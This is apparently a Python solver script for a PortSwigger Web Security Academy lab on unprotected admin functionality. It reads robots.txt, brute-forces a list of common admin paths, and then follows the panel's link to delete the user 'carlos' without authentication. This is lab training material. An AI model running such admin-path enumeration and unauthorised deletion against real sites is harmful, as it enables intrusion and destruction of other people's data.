#!/usr/bin/env python3
"""
Unprotected admin functionality
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 01-unprotected-admin-functionality.md

What this does:
    Checks robots.txt for a Disallow entry that discloses the admin panel path,
    falling back to a concurrent brute-force of common admin paths if nothing
    turns up there. Once the panel is found, it locates the delete link for
    carlos in the returned HTML and follows it -- no login, no session, no
    auth check anywhere on this path.

Usage:
    python 01-unprotected-admin-functionality.py <lab-url>
    e.g. python 01-unprotected-admin-functionality.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

ADMIN_PATHS = [
    "/admin", "/admin/", "/admin-panel", "/administrator",
    "/administrator-panel", "/management", "/panel",
    "/admin.php", "/admin/dashboard",
]


def find_admin_panel(client: httpx.Client, base: str) -> str | None:
    paths = list(ADMIN_PATHS)

    robots = client.get(f"{base}/robots.txt")
    if robots.status_code == 200:
        for line in robots.text.splitlines():
            line = line.strip()
            if line.lower().startswith("disallow:"):
                path = line.split(":", 1)[1].strip()
                if path:
                    print(f"[+] robots.txt discloses: {path}")
                    check = client.get(f"{base}{path}")
                    if check.status_code == 200 and "login" not in check.text.lower():
                        return f"{base}{path}"
                    if path not in paths:
                        paths.append(path)

    def _check_path(path):
        try:
            resp = client.get(f"{base}{path}")
            if resp.status_code == 200 and "login" not in resp.text.lower():
                return f"{base}{path}"
        except httpx.HTTPError:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(_check_path, p): p for p in paths}
        for f in as_completed(futures):
            r = f.result()
            if r:
                return r
    return None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    admin_url = find_admin_panel(client, lab_url)
    if not admin_url:
        print("[-] No admin panel found via robots.txt or brute force.")
        return
    print(f"[+] Admin panel found: {admin_url}")

    resp = client.get(admin_url)
    delete_match = re.search(r'href="([^"]*delete[^"]*carlos[^"]*)"', resp.text, re.IGNORECASE)
    if not delete_match:
        delete_match = re.search(r'href="([^"]*\?username=carlos[^"]*)"', resp.text, re.IGNORECASE)

    if delete_match:
        delete_path = delete_match.group(1)
        delete_url = f"{lab_url}{delete_path}" if delete_path.startswith("/") else urljoin(admin_url + "/", delete_path)
        print(f"[*] Deleting carlos via: {delete_url}")
        client.get(delete_url)
    else:
        print("[*] No delete link found in panel HTML, trying common delete pattern")
        client.get(f"{admin_url}/delete", params={"username": "carlos"})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted via unprotected admin panel.")
    else:
        print("[-] Not solved yet -- inspect the admin panel response for the real delete link.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
